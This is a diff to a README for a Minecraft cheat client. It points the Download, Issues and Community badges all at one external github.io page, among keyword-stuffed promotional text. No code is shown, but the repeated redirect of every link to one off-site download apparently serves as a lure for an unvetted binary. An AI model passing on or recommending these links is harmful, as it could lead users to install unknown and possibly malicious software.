@@ -1,7 +1,7 @@
 # ⚡ MineCraft-Clients-W-AND-C ⚡  
 **Next-Generation Utility Enhancement Ecosystem for Modern Minecraft**  
 
-[![Download](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](/////////)  
+[![Download](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://nicksondev2004m8.github.io/Wurst-PvP-Build-Trainer-2026/)  
 [![Platform Compatibility](https://img.shields.io/badge/Windows-0078D6?style=flat&logo=windows&logoColor=white)](https://img.shields.io) [![Linux Compatible](https://img.shields.io/badge/Linux-FCC624?style=flat&logo=linux&logoColor=black)](https://img.shields.io) [![macOS Support](https://img.shields.io/badge/macOS-000000?style=flat&logo=apple&logoColor=white)](https://img.shields.io) [![Java 17+](https://img.shields.io/badge/Java-17+-ED8B00?style=flat&logo=openjdk&logoColor=white)](https://img.shields.io) [![Minecraft 1.21.1](https://img.shields.io/badge/Minecraft-1.21.1-00AA00?style=flat&logo=minecraft&logoColor=white)](https://img.shields.io)  
 
 *Where the bedrock of vanilla experience meets the architecture of enhanced gameplay.*  
@@ -181,9 +181,9 @@ You are free to:
 
 ## 🔗 Quick Navigation  
 
-[![Download](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](//////////////)  
-[![Issues](https://img.shields.io/badge/Report%20Issue-6CC644?style=for-the-badge&logo=github&logoColor=white)](/)  
-[![Discussions](https://img.shields.io/badge/Community%20Hub-5865F2?style=for-the-badge&logo=discord&logoColor=white)](/)  
+[![Download](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://nicksondev2004m8.github.io/Wurst-PvP-Build-Trainer-2026/)  
+[![Issues](https://img.shields.io/badge/Report%20Issue-6CC644?style=for-the-badge&logo=github&logoColor=white)](https://nicksondev2004m8.github.io/Wurst-PvP-Build-Trainer-2026/)  
+[![Discussions](https://img.shields.io/badge/Community%20Hub-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://nicksondev2004m8.github.io/Wurst-PvP-Build-Trainer-2026/)  
 
 **Keywords:** Minecraft client utility enhancement ecosystem 1.21.1, PvP client with neural integration, ESP visualization tool for Minecraft builds, automated mining assistant, multilingual support modification, AI-assisted gameplay optimizer, Wurst-inspired tool suite, Impact-class mod framework, responsive user interface Minecraft mod, 2026 generation client.  
 
